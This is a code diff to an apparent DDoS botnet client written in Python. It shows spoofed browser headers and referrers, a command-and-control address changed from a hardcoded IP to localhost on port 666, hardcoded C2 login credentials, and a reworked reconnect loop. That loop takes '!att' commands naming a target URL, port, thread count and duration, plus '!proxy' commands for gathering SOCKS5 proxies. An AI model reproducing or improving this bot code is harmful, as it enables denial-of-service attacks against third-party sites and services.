@@ -26,7 +26,7 @@ from re import compile as compilee
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
 
-ipc2 = '198.50.160.231'
+ipc2 = 'localhost'
 portc2 = 666
 
 def strm(siz):
@@ -241,41 +241,68 @@ def socks5geter():
     pf.close()
 
 def main():
-    s = socket(AF_INET , SOCK_STREAM)
-    while 1:
-        try:
-            s.connect((ipc2 , portc2))
-            print('vpn connected')
-            sleep(0.5)
-            while 1:
-                data = s.recv(1024).decode()
-                if "Username" in data:
-                    s.send("kediam".encode())
-                    break
-            while 1:
-                data = s.recv(1024).decode()
-                if "Password" in data:
-                    s.send("FSOCIETY".encode())
-                    break
-            break
-        except:
-            sleep(5)
     while True:
+        s = None
+        connected = False
+
+        while not connected:
+            try:
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((ipc2, portc2))
+                print("VPN connected.")
+                connected = True 
+                while True:
+                    data = s.recv(1024)
+                    if b"Username" in data:
+                        s.send("kediam".encode())
+                        break
+                while True:
+                    data = s.recv(1024)
+                    if b"Password" in data:
+                        s.send("FSOCIETY".encode())
+                        break
+            except Exception as e:
+                if s:
+                    try:
+                        s.close()
+                    except:
+                        pass
+                s = None
+                sleep(5)
         try:
-            c2 = s.recv(1024).decode().strip()
-            if c2.split()[0] == '!att':
-                method = str(c2.split()[1])
-                url = str(c2.split()[2])
-                port = int(c2.split()[3])
-                threads = int(c2.split()[4])
-                rpc = int(c2.split()[5])
-                timme = int(c2.split()[6])
-                timer = time() + timme
-            elif c2.split()[0] == '!proxy':
-                thr(target=socks5geter).start()
+            while True:
+                try:
+                    data = s.recv(1024)
+                    if not data:
+                        raise ConnectionResetError("Connection closed by server.")
+                    try:
+                        c2 = data.decode('utf-8', errors='ignore').strip()
+                    except UnicodeDecodeError as e:
+                        continue
+
+                    if c2.split()[0] == '!att':
+                        method = str(c2.split()[1])
+                        url = str(c2.split()[2])
+                        port = int(c2.split()[3])
+                        threads = int(c2.split()[4])
+                        rpc = int(c2.split()[5])
+                        timme = int(c2.split()[6])
+                        timer = time() + timme
+                    elif c2.split()[0] == '!proxy':
+                        thr(target=socks5geter).start()
+                except Exception as e:
+                    break
         except:
             pass
 
+        finally:
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
+            connected = False
+            sleep(5)
         try:
             us = UserAgent()
             ua = us.random
